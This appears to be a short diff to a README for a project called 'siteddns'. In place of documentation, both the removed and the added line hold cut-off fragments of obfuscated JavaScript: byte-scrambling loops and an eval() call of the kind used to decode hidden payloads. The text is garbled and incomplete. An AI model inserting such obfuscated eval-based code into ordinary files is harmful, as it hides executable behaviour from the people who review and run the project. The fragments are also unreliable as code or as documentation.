@@ -1,2 +1,2 @@
  # siteddns
-48)break;nf[pf]=(nf[pf]+nf[pf+1])&0xff;pf++;}while(true);";eval(pf);pf="pf=47;do{if(pf
+=4;){af[cf]=(-((af[cf]+af[cf-1])&0xff))&0xff;cf--;}cf=51;for(;cf>=2;){af[cf]=(af[cf]-af[cf-1])&0xff;af[cf]=(-af[cf])&0xff;af[cf]=(~af[cf])&0xff;cf--;}cf=1;while(cf
